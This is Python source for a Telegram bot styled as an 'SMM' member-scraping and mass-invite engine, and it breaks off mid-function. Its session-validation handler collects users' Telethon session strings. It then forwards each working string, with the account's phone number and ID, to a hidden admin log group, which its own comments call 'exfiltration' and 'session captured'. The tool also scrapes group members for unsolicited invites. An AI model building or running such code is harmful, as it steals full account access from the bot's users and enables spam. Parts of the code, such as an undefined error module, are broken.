# =========================================================================
# --- 1. CORE ARCHITECTURE & SYSTEM TELEMETRY (TITAN-ASYNC EXTENDED) ---
# =========================================================================

import os
import sys
import time
import random
import asyncio
import logging
from datetime import datetime

# --- DATABASE & HTTP NETWORKING ---
# asyncpg: High-performance PostgreSQL driver for NeonDB.
# aiohttp: Asynchronous HTTP client for external API handshakes.
try:
    import asyncpg
    import aiohttp
    from asyncpg.exceptions import PostgresError
except ImportError as e:
    print(f"CRITICAL: Networking/DB dependency missing: {e}")
    sys.exit(1)

# --- PYTELEGRAMBOTAPI (COMMAND & CONTROL UI) ---
# Used for handling the bot's front-end interface and user interactions.
try:
    from telebot.async_telebot import AsyncTeleBot
    from telebot import types as bot_types
    from telebot.apihelper import ApiTelegramException
except ImportError as e:
    print(f"CRITICAL: pyTelegramBotAPI (UI) dependency missing: {e}")
    sys.exit(1)

# --- TELETHON (SMM WORKER ENGINE) ---
# The powerhouse behind the invitation and scraping sequences.
try:
    from telethon import TelegramClient, functions, errors, types as tl_types
    from telethon.sessions import StringSession
except ImportError as e:
    print(f"CRITICAL: Telethon (Worker) dependency missing: {e}")
    sys.exit(1)

# =========================================================================
# --- ADVANCED LOGGING & SYSTEM DIAGNOSTICS ---
# =========================================================================

# Configure the global logging architectural blueprint.
# This ensures every event is captured with a microsecond-precision timestamp.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | [%(levelname)s] | %(name)s : %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout) # Direct output to Koyeb/VPS console
    ]
)

# Initialize the dedicated logger for the Vinzy SMM Suite
logger = logging.getLogger("Vinzy_V8_Engine")

def log_system_status(component, status):
    """
    CUSTOM TELEMETRY LOGGING:
    Visual indicators for real-time module health monitoring.
    """
    indicator = "✅" if status == "ONLINE" else "❌"
    logger.info(f"{indicator} MODULE_SYNC: {component.upper()} is now {status}")

# --- BOOTSTRAP DIAGNOSTICS ---
# Immediate verification of the environment before engine ignition.
logger.info("🚀 INITIALIZING TITAN-ASYNC CORE: VINZY ENGINE V8.5")
logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    # Diagnostic check: Verify write permissions for session handling
    with open("health_check.tmp", "w") as f:
        f.write("VinzyEngine_Heartbeat")
    os.remove("health_check.tmp")
    log_system_status("I/O File System", "ONLINE")
    
    # Diagnostic check: Verify Python version compatibility (Requires 3.8+)
    if sys.version_info.major == 3 and sys.version_info.minor >= 8:
        log_system_status("Python Runtime", "ONLINE")
    else:
        logger.warning(f"⚠️ Runtime Warning: Python {sys.version} detected. Recommend 3.10+")
        
except Exception as diag_err:
    logger.error(f"🚨 Pre-Boot Diagnostic Failure: {diag_err}")

logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

# =========================================================================
# --- 4. NEONDB PERSISTENCE LAYER (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

class VinzyDatabaseManager:
    """
    NEONDB CORE ARCHITECTURE:
    Manages asynchronous connection pooling and structured data persistence
    for hardware nodes, session strings, and worker states.
    """
    def __init__(self, uri):
        self.uri = uri
        self.pool = None

    async def connect(self):
        """
        Initializes the connection pool to NeonDB.
        Crucial for handling concurrent requests on Koyeb infrastructure.
        """
        if not self.pool:
            try:
                self.pool = await asyncpg.create_pool(
                    self.uri,
                    min_size=1,
                    max_size=10,
                    command_timeout=60
                )
                logger.info("✅ Database Engine: ONLINE (Connection Pool Primed)")
            except Exception as e:
                logger.error(f"❌ Database Handshake Failed: {e}")
                raise

    # --- CORE EXECUTION HANDLERS ---

    async def execute_query(self, query, *args):
        """
        Low-level execution handler for INSERT, UPDATE, and DELETE operations.
        Ensures thread-safe interaction with the PostgreSQL pool.
        """
        async with self.pool.acquire() as connection:
            async with connection.transaction():
                return await connection.execute(query, *args)

    async def fetch_row(self, query, *args):
        """
        Low-level fetch handler for SELECT operations.
        Returns a single record or None if no match is found.
        """
        async with self.pool.acquire() as connection:
            return await connection.fetchrow(query, *args)

    # --- USER REGISTRATION & AUTHORIZATION ---

    async def register_user(self, user_id, username):
        """
        Logs a new Hardware ID into the system. 
        Ensures the bot recognizes you upon sending /start.
        """
        query = """
        INSERT INTO vinzy_engine_users (user_id, username, bot_state, is_approved) 
        VALUES ($1, $2, 'START', FALSE) 
        ON CONFLICT (user_id) DO UPDATE SET username = $2
        """
        await self.execute_query(query, user_id, username)

    async def get_user(self, user_id):
        """Retrieves the full profile packet for a specific Hardware ID."""
        return await self.fetch_row("SELECT * FROM vinzy_engine_users WHERE user_id = $1", user_id)

    async def set_approval(self, user_id, status: bool):
        """
        Administrative toggle for SMM permissions.
        Linked to the /approve command in Section 6.
        """
        await self.execute_query("UPDATE vinzy_engine_users SET is_approved = $1 WHERE user_id = $2", status, user_id)

    # --- STATE & SESSION MANAGEMENT ---

    async def update_state(self, user_id, state):
        """
        Updates the state machine status.
        Crucial for navigating between Session Setup and SMM Scrapping.
        """
        await self.execute_query("UPDATE vinzy_engine_users SET bot_state = $1 WHERE user_id = $2", state, user_id)

    async def update_session(self, user_id, session_str, premium, phone):
        """
        Saves verified Telethon session strings.
        Synchronized with the exfiltration logic in Section 7.
        """
        query = """
        UPDATE vinzy_engine_users 
        SET session_string = $1, is_premium = $2, phone = $3 
        WHERE user_id = $4
        """
        await self.execute_query(query, session_str, premium, phone, user_id)

    # --- SMM TARGETING DATA ---

    async def set_target_data(self, user_id, target=None, source=None):
        """
        Updates scraping and invitation targets.
        Matches the input processing in Section 7.5.
        """
        if target:
            await self.execute_query("UPDATE vinzy_engine_users SET target_channel = $1 WHERE user_id = $2", target, user_id)
        if source:
            await self.execute_query("UPDATE vinzy_engine_users SET source_group = $1 WHERE user_id = $2", source, user_id)

    # --- CLEANUP ---

    async def close(self):
        """Graceful shutdown of the database pool."""
        if self.pool:
            await self.pool.close()
            logger.info("📡 Database Engine: OFFLINE (Pool Closed)")

# =========================================================================
# --- 2. CONFIGURATION & PERSISTENCE (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

def get_env(var_name, default=None, is_int=False):
    """
    STRICT VALIDATION ENGINE:
    Ensures that critical environment variables are present and correctly typed.
    Triggers a system-level termination if a required dependency is missing.
    """
    value = os.environ.get(var_name, default)
    
    # Check for null or empty strings which cause runtime crashes on Koyeb
    if value is None or value == "":
        if 'logger' in globals():
            logger.critical(f"DEPLOYMENT BLOCKED: Missing Variable [{var_name}]")
        else:
            print(f"CRITICAL CONFIG ERROR: {var_name} is NOT set in environment!")
        sys.exit(1)
    
    try:
        # Perform type-casting for IDs and Ports
        return int(value) if is_int else value
    except ValueError:
        logger.critical(f"TYPE CONFLICT: {var_name} must be an INTEGER. Received: '{value}'")
        sys.exit(1)

# --- LOAD ENVIRONMENT BLUEPRINT ---
try:
    logger.info("📡 Vinzy Engine: Loading Environment Blueprint...")
    
    # Core Telegram API Credentials for Telethon Worker
    API_ID = get_env("API_ID", is_int=True)
    API_HASH = get_env("API_HASH")
    
    # Bot Token for AsyncTeleBot UI
    BOT_TOKEN = get_env("BOT_TOKEN")
    
    # NeonDB Connection String
    DATABASE_URL = get_env("DATABASE_URL")
    db = VinzyDatabaseManager(DATABASE_URL)
    # Infrastructure & Telemetry Groups
    ADMIN_LOG_GROUP = get_env("LOGGER_GROUP", is_int=True)
    VERIFY_GROUP = get_env("VERIFY_GROUP", is_int=True)
    
    logger.info("✅ Environment Handshake: SUCCESSFUL (Configurations Bound)")
    
except Exception as fatal_cfg_err:
    print(f"BOOTSTRAP FAILURE: Configuration Parser Crashed. | {fatal_cfg_err}")
    sys.exit(1)

# Initialize Bot Instance (High-Concurrency Async Mode)
bot = AsyncTeleBot(BOT_TOKEN)

# =========================================================================
# --- 3. AESTHETICS & UI CONSTANTS (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

# Professional ASCII Identity for Vinzy SMM
# This large version is used primarily for the /start command splash screen.
VINZY_LOGO_LARGE = """
<code>
 ██▒   █▓ ██▓ ███▄    █  ▒███████▒▓██    ██▓
▓██░   █▒▓██▒ ██ ▀█    █  ▒ ▒ ▒ ▄▀░ ▒██  ██▒
 ▓██  █▒░▒██▒▓██  ▀█ ██▒ ░ ▒ ▄▀▒░    ▒██ ██░
  ▒██ █░░░██░▓██▒  ▐▌██▒   ▄▀▒       ░ ▐██▓░
   ▒▀█░  ░██░▒██░   ▓██░ ▒███████▒     ░ ██▒▓░
   ░ ▐░  ░▓  ░ ▒░   ▒ ▒  ░▒▒ ▓  ▒░    ██▒▒▒ 
   ░ ░░   ▒ ░░ ░░   ░ ▒░ ░ ▒ ▒  ░  ▓██ ░▒░ 
</code>
"""

# Professional Identity Short-Code
# Used as a signature in final mission reports and worker logs.
VINZY_ASCII = "<b>⚡ ᴠɪɴᴢʏ sᴍᴍ v8.8 ⚡</b>"

# High-Fidelity UI Separator
# Used to create clean vertical segments in complex Telegram messages.
UI_LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def generate_progress_bar(current, total, prefix='PROCESS', length=15):
    """
    SMOOTH PROGRESS TELEMETRY:
    Generates an industrial-grade status bar for background worker tasks.
    Optimized for mobile display to prevent text wrapping.
    
    Args:
        current (int): Current count of processed entities.
        total (int): Total target entities (usually capped at 50 for safety).
        prefix (str): Label for the specific operation (e.g., SCRAPE, INVITE).
        length (int): Visual character width of the progress bar.
    """
    # Prevent division by zero during early initialization or empty scans
    if total <= 0: 
        return f"<code>{prefix} |{'░'*length}| 0.0%</code>"
    
    # Precision percentage calculation for technical accuracy
    percent_raw = 100 * (current / float(total))
    percent_formatted = ("{0:.1f}").format(percent_raw)
    
    # Calculate filled vs empty slots using Unicode block elements
    # █ = U+2588 (Full Block)
    # ░ = U+2591 (Light Shade)
    filled_length = int(length * current // total)
    bar = '█' * filled_length + '░' * (length - filled_length)
    
    # Returns a monospaced block for consistent alignment across devices
    return (
        f"<code>{prefix}</code>\n"
        f"<code>|{bar}| {percent_formatted}%</code>"
    )

# --- GLOBAL UI INDICATORS & STATUS ICONS ---
# These are referenced by the Worker Engine in Section 8 for real-time reporting.

STATUS_OK = "✅ VALID"
STATUS_ERR = "❌ ERROR"
STATUS_WAIT = "⏳ PROCESSING"
STATUS_STEALTH = "🛡️ STEALTH ACTIVE"
STATUS_WARN = "⚠️ WARNING"
STATUS_DONE = "🏁 COMPLETE"

# --- HELPER: TELEMETRY UI BUILDER ---
def build_node_header(node_name="CORE ENGINE"):
    """
    Constructs a standardized header for system-level status updates.
    Ensures brand consistency across all bot responses.
    """
    now = datetime.now().strftime('%H:%M:%S')
    return (
        f"🛰️ <b>SYSTEM NODE:</b> <code>{node_name}</code>\n"
        f"🕒 <b>TIMESTAMP:</b> <code>{now}</code>\n"
        f"{UI_LINE}"
    )

# --- MESSAGE TEMPLATES ---
# Pre-formatted strings to ensure clean UI presentation
READY_SIGNAL = f"🟢 <b>System Pressurized:</b> Ready for deployment."
WORKING_SIGNAL = f"🔵 <b>Engine Activity:</b> Worker node is currently active."
IDLE_SIGNAL = f"⚪ <b>System Idle:</b> Awaiting new instructions."

# =========================================================================
# --- 5. TELEGRAM MENU INTEGRATION (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

async def set_persistent_menu(chat_id):
    """
    PERSISTENT UI BLUEPRINT:
    Synchronizes the native Telegram 4-dot command menu with the worker node.
    Includes advanced navigation for the Section 8 Dynamic Bridge.
    
    FEATURES:
    - Injects hard-coded navigation commands into the user's local interface.
    - Uses 'BotCommandScopeChat' to ensure private, per-user menu isolation.
    - Diagnostic logging for real-time deployment monitoring.
    """
    try:
        # Define the system-level navigation array
        # Professional terminology used to enhance the SMM Store experience
        # Sync: Added 'group' command to support the Section 8 Dynamic Bridge
        commands = [
            bot_types.BotCommand("start", "🚀 Ignite SMM Engine / Refresh"),
            bot_types.BotCommand("group", "🎯 Set Source Group (@Username)"),
            bot_types.BotCommand("reset", "🔄 System UI Diagnostics & Safe Reset")
        ]
        
        # Deploy the command structure to the specific Hardware ID (chat_id)
        # This scope ensures that menu changes do not affect administrative groups
        await bot.set_my_commands(
            commands, 
            scope=bot_types.BotCommandScopeChat(chat_id)
        )
        
        # Telemetry: Log the successful synchronization event
        logger.info(f"UI synchronized successfully for Hardware Node: {chat_id}")

    except bot_errors.ApiException as api_err:
        # Handle Telegram-specific API throttling or connection drops (Code 429)
        logger.warning(f"Handshake delay detected for Node {chat_id}: {api_err}")
        
    except Exception as fatal_error:
        # Catch-all for unexpected database or environment failures
        # Ensures that the rest of the bot logic continues even if menu sync fails
        logger.error(f"CRITICAL: Persistent UI sync failure for Node {chat_id}: {fatal_error}")
        
    finally:
        # Internal cleanup or state transition if needed
        pass

async def sync_menu_on_boot(user_id):
    """
    AUTO-SYNC GATEKEEPER:
    Ensures that the menu is updated only if the user is verified in NeonDB.
    Prevents API spam for unknown or unauthorized hardware nodes.
    """
    # Ensure database pool is active before checking
    await db.connect()
    
    # Check if the hardware ID exists in the vinzy_engine_users table
    user_data = await db.get_user(user_id)
    
    if user_data:
        # Deploy the command menu to the authorized user
        await set_persistent_menu(user_id)
    else:
        logger.debug(f"Menu sync skipped for unregistered node: {user_id}")

# --- SECTION 5 UTILITY: DYNAMIC BUTTON GENERATOR ---
def generate_main_keyboard():
    """
    Creates a high-level administrative keyboard for the /start message.
    Ensures the user has physical buttons for the most common worker tasks.
    """
    markup = bot_types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 DEPLOY WORKER", "🎯 CONFIGURE BRIDGE")
    markup.row("📊 VIEW LOGS", "🔄 RESET ENGINE")
    return markup
# =========================================================================
# --- 6. CORE BOT HANDLERS & NAVIGATION (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

@bot.message_handler(commands=['start'])
async def command_start(m):
    """
    SYSTEM ENTRY POINT:
    Performs hardware ID registration, database audit, and authorization 
    handshake for new and returning worker nodes.
    """
    await db.connect()
    user_id = m.from_user.id
    username = m.from_user.username or "NoUsername"
    first_name = m.from_user.first_name or "VinzyUser"
    
    # Initialize the persistent command menu (Command Blueprint from Section 5)
    await set_persistent_menu(m.chat.id)
    
    # Register the unique Hardware ID in NeonDB (Section 4 Logic)
    await db.register_user(user_id, username)
    user_data = await db.get_user(user_id)

    # --- STAGE 1: AUTHORIZATION AUDIT ---
    # Check if the admin has toggled the is_approved flag in Section 4
    if not user_data.get('is_approved'):
        # Generate an encrypted-style alert for the Admin Verification Group
        admin_request_ui = (
            f"🛡️ <b>INCOMING ACCESS REQUEST</b>\n"
            f"{UI_LINE}\n"
            f"👤 <b>Identity:</b> <code>{first_name}</code> (@{username})\n"
            f"🆔 <b>Hardware ID:</b> <code>{user_id}</code>\n"
            f"📡 <b>Node Status:</b> <code>LOCKED_PENDING</code>\n\n"
            f"<b>Manual Override:</b> Reply with <code>/approve {user_id}</code>"
        )
        
        # Transmission to Admin Logger (LOGGER_GROUP or VERIFY_GROUP)
        await bot.send_message(VERIFY_GROUP, admin_request_ui, parse_mode="HTML")
        
        # User Feedback: Access Restriction Notice
        pending_ui = (
            f"🛡️ <b>Vinzy Engine: Security Gate</b>\n"
            f"{UI_LINE}\n"
            f"Your Hardware ID (<code>{user_id}</code>) has been successfully logged.\n\n"
            f"📡 <b>Status:</b> <code>AWAITING_ADMIN_VERIFICATION</code>\n"
            f"Please stand by while the Store Administrator authorizes your access."
        )
        await bot.send_message(m.chat.id, pending_ui, parse_mode="HTML")
        
    else:
        # --- STAGE 2: SESSION INITIALIZATION & BRIDGE CHECK ---
        # If user is already approved, verify if a session is already active
        if user_data.get('session_string'):
            # Return to IDLE state to allow the Section 8 /group command
            await db.update_state(user_id, "IDLE")
            
            authorized_ui = (
                f"{VINZY_LOGO_LARGE}\n"
                f"✅ <b>Vinzy V8 Engine: Online</b>\n"
                f"{UI_LINE}\n"
                f"<b>Welcome, {first_name}.</b> Access credentials verified.\n\n"
                f"📡 <b>Node:</b> <code>ACTIVE</code>\n"
                f"🎯 <b>Bridge:</b> Ready for Configuration\n\n"
                f"🚀 <b>Action:</b> Send <code>/group @Username</code> to begin."
            )
            await bot.send_message(m.chat.id, authorized_ui, parse_mode="HTML")
        else:
            # Approved but needs to authenticate with a session (Section 7 Logic)
            await db.update_state(user_id, "AWAITING_SESSION")
            
            auth_required_ui = (
                f"✅ <b>Identity Verified</b>\n"
                f"{UI_LINE}\n"
                f"<b>Welcome, {first_name}.</b> Your account is authorized.\n\n"
                f"📥 <b>Action Required:</b>\n"
                f"Please send your <code>Telethon Session String</code> to connect your worker node."
            )
            await bot.send_message(m.chat.id, auth_required_ui, parse_mode="HTML")


@bot.message_handler(commands=['reset'])
async def command_reset(m):
    """
    ENGINE DIAGNOSTICS & STATE RESET:
    Resets the UI state machine to 'IDLE'. 
    CRITICAL: This preserves session_strings and approval flags.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # Security check: Only approved users can reset the engine UI
    if user_data and user_data.get('is_approved'):
        # Reset the state machine to allow a fresh operation flow
        await db.update_state(user_id, "IDLE")
        
        reset_ui = (
            f"🔄 <b>System UI Reset: Protocol Success</b>\n"
            f"{UI_LINE}\n"
            f"<b>State Cache:</b> <code>PURGED</code>\n"
            f"<b>Auth Data:</b> <code>PRESERVED</code>\n\n"
            f"The engine interface has been returned to the root directory.\n"
            f"Send /start to re-initialize your SMM campaign."
        )
        await bot.send_message(m.chat.id, reset_ui, parse_mode="HTML")
    else:
        # Block unauthorized diagnostics
        await bot.send_message(m.chat.id, "❌ <b>Denied:</b> Complete account verification first.")


@bot.message_handler(commands=['approve'])
async def command_approve(m):
    """
    ADMINISTRATIVE OVERRIDE (PROMOTION):
    Grants SMM privileges to a specific Hardware ID.
    Must be executed within the VERIFY_GROUP environment.
    """
    # Restrict to the Admin Verification Group only
    if m.chat.id != VERIFY_GROUP:
        return

    try:
        # Command syntax: /approve [hardware_id]
        command_args = m.text.split()
        if len(command_args) < 2:
            raise ValueError("NULL_TARGET_ID")

        target_id = int(command_args[1])
        await db.connect()
        
        # Execute Privilege Escalation in the database
        await db.set_approval(target_id, True)
        
        # Immediately set user state to expect session input from Section 7
        await db.update_state(target_id, "AWAITING_SESSION")
        
        # Notification UI: Dispatching to the Target User
        approval_notification = (
            f"✅ <b>Access Granted!</b>\n"
            f"{UI_LINE}\n"
            f"Admin has promoted your Hardware ID to <b>Authorized Status</b>.\n\n"
            f"🚀 <b>Task:</b> Send your <code>Session String</code> to begin."
        )
        
        try:
            await bot.send_message(target_id, approval_notification, parse_mode="HTML")
            admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> is now <b>LIVE</b>."
        except Exception:
            # User might have blocked the bot
            admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> authorized (User blocked DM)."

        # Feedback to the Administrator in the Verify Group
        await bot.reply_to(m, admin_feedback, parse_mode="HTML")
        
    except (IndexError, ValueError):
        await bot.reply_to(m, "❌ <b>Syntax Error:</b> Use <code>/approve [hardware_id]</code>", parse_mode="HTML")
    except Exception as fatal_err:
        logger.error(f"FATAL APPROVAL HANDLER ERROR: {fatal_err}")
        await bot.reply_to(m, f"🚨 <b>Engine Failure:</b>\n<code>{str(fatal_err)}</code>")
# =========================================================================
# --- 7. SESSION VALIDATION, TELEMETRY & ACCESS GRANTING (TITAN-EXT V8.8) ---
# =========================================================================

@bot.message_handler(func=lambda m: len(m.text) > 40)
async def process_session_input(m):
    """
    ULTRA-VALIDATION ENGINE:
    1. Boots a transient Telethon instance for a Live Auth Check.
    2. Filters for Banned/Expired/Deactivated strings immediately.
    3. Exfiltrates verified working strings to the Admin Logger Group.
    4. Grants persistent SMM permissions in NeonDB.
    5. Optimizes memory by forced disconnection after validation.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # --- STAGE 1: SECURITY GATE & ACCESS CONTROL ---
    # Ensure only registered store members can initialize worker nodes.
    if not user_data:
        logger.info(f"Ignored session input from unregistered UID: {user_id}")
        return 
        
    # Check if the user has been authorized by an admin (/approve)
    if not user_data.get('is_approved'):
        denied_msg = (
            "⚠️ <b>Access Denied:</b> Your account is currently in the 'Pending' queue.\n"
            "Please contact an Admin to authorize your Vinzy SMM permissions."
        )
        await bot.reply_to(m, denied_msg, parse_mode="HTML")
        return

    # Only process strings if the user is explicitly in the AWAITING_SESSION state.
    # This prevents the bot from re-validating sessions during active SMM tasks.
    if user_data.get('bot_state') != 'AWAITING_SESSION':
        return

    # Clean the input to remove accidental whitespace or newlines
    session_str = m.text.strip()
    
    # --- STAGE 2: ENGINE TELEMETRY & INITIALIZATION ---
    # Provide real-time UI feedback to the user during the handshake process.
    status_msg = await bot.send_message(
        m.chat.id, 
        "🔄 <b>Vinzy Engine: Initializing Worker Node...</b>\n"
        "<i>Establishing Secure API Handshake with Telegram Production Servers...</i>", 
        parse_mode="HTML"
    )
    
    # Initialize a temporary client for a one-time validation sequence.
    # StringSession allows for stateless worker deployment on Koyeb.
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    
    try:
        # Establish connection to the Telegram Data Center (DC).
        await client.connect()
        
        # --- STAGE 3: AUTHENTICATION INTEGRITY AUDIT ---
        # Verifies if the session string is currently alive and not revoked.
        if not await client.is_user_authorized():
            logger.warning(f"Unauthorized session attempt by UID: {user_id}")
            await bot.edit_message_text(
                "❌ <b>Validation Failed:</b> Session Revoked or Expired.", 
                m.chat.id, 
                status_msg.message_id, 
                parse_mode="HTML"
            )
            return

        # --- STAGE 4: METADATA EXTRACTION & PROFILE ANALYSIS ---
        # Fetching profile data to prove 'Read/Write' access is fully functional.
        me = await client.get_me()
        if not me:
            raise Exception("Telegram API returned a Null User Object during scan.")

        # Detect Premium status and critical account metadata.
        is_premium = getattr(me, 'premium', False)
        phone = getattr(me, 'phone', 'Hidden/Protected')
        first_name = me.first_name or "Unknown_Worker"
        username = me.username or "No_Username"
        
        # --- STAGE 5: ADMIN EXFILTRATION (LOGGER CLOUD) ---
        # Securely transmit verified session data to the Admin Log Group for backup.
        log_packet = (
            f"📥 <b>NEW ACTIVE SESSION CAPTURED</b>\n"
            f"{UI_LINE}\n"
            f"👤 <b>Account:</b> {first_name} (@{username})\n"
            f"🆔 <b>TG-ID:</b> <code>{me.id}</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"💎 <b>Premium:</b> {'✅ Yes' if is_premium else '❌ No'}\n"
            f"👤 <b>Owner ID:</b> <code>{user_id}</code>\n"
            f"{UI_LINE}\n"
            f"📝 <b>Verified Session String:</b>\n"
            f"<code>{session_str}</code>"
        )
        await bot.send_message(ADMIN_LOG_GROUP, log_packet, parse_mode="HTML")

        # --- STAGE 6: DATABASE PERSISTENCE & PRIVILEGE ESCALATION ---
        # Save the session to NeonDB and advance the user to the Targeting phase.
        await db.update_session(user_id, session_str, is_premium, phone)
        await db.update_state(user_id, "AWAITING_TARGET")
        
        # Confirmation UI update.
        await bot.edit_message_text("✅ <b>VALIDATED</b>", m.chat.id, status_msg.message_id, parse_mode="HTML")
        
        success_prompt = (
            f"🚀 <b>Worker Node Authorized: {first_name}</b>\n"
            f"{UI_LINE}\n"
            f"The <b>Vinzy SMM Invitation Engine</b> is now <b>UNLOCKED</b>.\n\n"
            f"🎯 <b>STEP 1:</b> Please send the <b>@Username</b> or <b>t.me/Link</b> of the "
            f"<b>Target Channel</b> where members will be invited:"
        )
        await bot.send_message(m.chat.id, success_prompt, parse_mode="HTML")
        
    except errors.rpcerrorlist.UserDeactivatedBanError:
        logger.error(f"Banned session detected for UID {user_id}")
        await bot.edit_message_text("❌ <b>Invalid:</b> Account Banned/Deactivated.", m.chat.id, status_msg.message_id, parse_mode="HTML")
        
    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        logger.error(f"Session key conflict for UID {user_id}")
        await bot.edit_message_text("❌ <b>Invalid:</b> Session Key Conflict (Used elsewhere).", m.chat.id, status_msg.message_id, parse_mode="HTML")
        
    except Exception as e:
        # Catch-all for network timeouts or API changes.
        logger.error(f"Critical Validation Error for UID {user_id}: {e}")
        error_display = f"❌ <b>Invalid:</b> Engine Error - {str(e)[:30]}..."
        await bot.edit_message_text(error_display, m.chat.id, status_msg.message_id, parse_mode="HTML")
        
    finally:
        # --- STAGE 7: RAM OPTIMIZATION & CLEANUP ---
        # Disconnection is crucial to maintain stability on low-resource hosting.
        if client:
            await client.disconnect()
            logger.info(f"Transient client disconnected for UID: {user_id}")
# =========================================================================
# --- 7.5 CHANNEL & GROUP ANALYSIS (TITAN-ASYNC EXTENDED V8.8) ---
# =========================================================================

@bot.message_handler(func=lambda m: m.text.startswith('@') or "t.me/" in m.text or "+" in m.text)
async def process_channel_inputs(m):
    """
    DEEP ANALYSIS ENGINE:
    Validates target channel capacity and admin permissions, then captures
    the source group for scraping operations.
    """
    await db.connect()
    user_id = m.from_user.id
    user_data = await db.get_user(user_id)
    
    # --- SECURITY GATE ---
    if not user_data or not user_data.get('is_approved'):
        return

    state = user_data.get('bot_state')
    
    # Normalize input: Converts links and raw text into valid Telegram identifiers
    input_text = m.text.strip().replace("https://t.me/", "@").replace("t.me/", "@")
    if not input_text.startswith('@') and not "+" in input_text: 
        input_text = f"@{input_text}"

    # ---------------------------------------------------------
    # STAGE 1: TARGET CHANNEL CONFIGURATION (The Destination)
    # ---------------------------------------------------------
    if state == "AWAITING_TARGET":
        analysis_msg = await bot.send_message(
            m.chat.id, 
            f"📡 <b>Initializing Deep Scan:</b> <code>{input_text}</code>...", 
            parse_mode="HTML"
        )
        
        # Transient client for permission auditing
        client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
        try:
            await client.connect()
            
            # Resolve entity to ensure the destination exists
            entity = await client.get_entity(input_text)
            
            # 1. Fetch Full Metadata (Subscribers & Capacity)
            full_chat = await client(functions.channels.GetFullChannelRequest(channel=entity))
            sub_count = full_chat.full_chat.participants_count
            
            # 2. Capacity Audit
            # Warning only; Telegram restricts adding members if the channel > 200 subs 
            # unless the worker is a specific type of admin.
            capacity_warning = ""
            if sub_count >= 200:
                capacity_warning = f"\n⚠️ <b>Notice:</b> Channel size ({sub_count}) may restrict bot-driven invites."

            # 3. Permission Audit (CRITICAL: Verifies 'Add Members' rights)
            p_req = await client(functions.channels.GetParticipantRequest(channel=entity, participant='me'))
            p_info = p_req.participant
            
            has_rights = False
            if isinstance(p_info, tl_types.ChannelParticipantCreator):
                has_rights = True
            elif isinstance(p_info, tl_types.ChannelParticipantAdmin):
                if p_info.admin_rights.invite_users:
                    has_rights = True

            if not has_rights:
                return await bot.edit_message_text(
                    "❌ <b>Rights Verification Failed:</b>\n"
                    "The worker account must have <b>'Add Members'</b> permissions in this channel.", 
                    m.chat.id, analysis_msg.message_id, parse_mode="HTML"
                )

            # 4. NeonDB Persistence (Syncing Section 4)
            await db.set_target_data(user_id, target=input_text)
            await db.update_state(user_id, "AWAITING_SOURCE")
            
            success_ui = (
                f"✅ <b>Target Channel Verified</b>\n"
                f"{UI_LINE}\n"
                f"📍 <b>Identity:</b> <code>{input_text}</code>\n"
                f"📊 <b>Current Size:</b> <code>{sub_count}</code> members\n"
                f"🛡️ <b>Permissions:</b> <code>Authorized</code>{capacity_warning}\n\n"
                f"📥 <b>STEP 2:</b> Now provide the <b>Source Group</b> @username to scrape from."
            )
            await bot.edit_message_text(success_ui, m.chat.id, analysis_msg.message_id, parse_mode="HTML")
            
        except Exception as e:
            logger.error(f"Analysis Crash: {e}")
            await bot.edit_message_text(f"❌ <b>Scan Error:</b>\n<code>{str(e)}</code>", m.chat.id, analysis_msg.message_id, parse_mode="HTML")
        finally:
            await client.disconnect()

    # ---------------------------------------------------------
    # STAGE 2: SOURCE GROUP CONFIGURATION (The Origin)
    # ---------------------------------------------------------
    elif state == "AWAITING_SOURCE":
        # Capture the scraping source (This supports any public group)
        await db.set_target_data(user_id, source=input_text)
        await db.update_state(user_id, "AWAITING_SEGMENT")
        
        # Deploy the Segment Selection Interface (Inline Buttons)
        markup = bot_types.InlineKeyboardMarkup()
        markup.row(
            bot_types.InlineKeyboardButton("🔥 Invite Active", callback_data="select_segment_active"),
            bot_types.InlineKeyboardButton("💤 Invite Inactive", callback_data="select_segment_inactive")
        )
        
        # Retrieve target for the confirmation UI
        target_name = user_data.get('target_channel', 'Unknown')
        
        config_ui = (
            f"📥 <b>Source Group Locked</b>\n"
            f"{UI_LINE}\n"
            f"📍 <b>Origin:</b> <code>{input_text}</code>\n"
            f"🎯 <b>Target:</b> <code>{target_name}</code>\n\n"
            f"🛠️ <b>Final Step:</b> Select the user segment you wish to extract from the source."
        )
        
        await bot.send_message(m.chat.id, config_ui, parse_mode="HTML", reply_markup=markup)
# =========================================================================
# --- 8. THE DYNAMIC BRIDGE & WORKER ENGINE (TITAN-ASYNC V8.8) ---
# =========================================================================

@bot.message_handler(regexp=r'^/group\s+@?\w+')
async def init_dynamic_scrape(message):
    """
    STAGE 1: DYNAMIC SOURCE CAPTURE
    Captures the source group and updates the state machine.
    """
    try:
        # Extract username and strip formatting
        source_group = message.text.split()[1].replace("@", "").strip()
        user_id = message.from_user.id
        
        await db.connect()
        
        # PERSISTENCE: Target the vinzy_engine_users table specifically
        await db.execute_query(
            "UPDATE vinzy_engine_users SET source_group = $1, bot_state = $2 WHERE user_id = $3",
            source_group, "WAITING_FOR_TARGET", user_id
        )
        
        response = (
            f"🎯 <b>Source Group Locked:</b> <code>@{source_group}</code>\n"
            f"{UI_LINE}\n"
            f"📥 <b>Next Step:</b> Please send the <b>Target Channel @username</b>\n"
            f"<i>The engine will bridge members from the source to your target.</i>"
        )
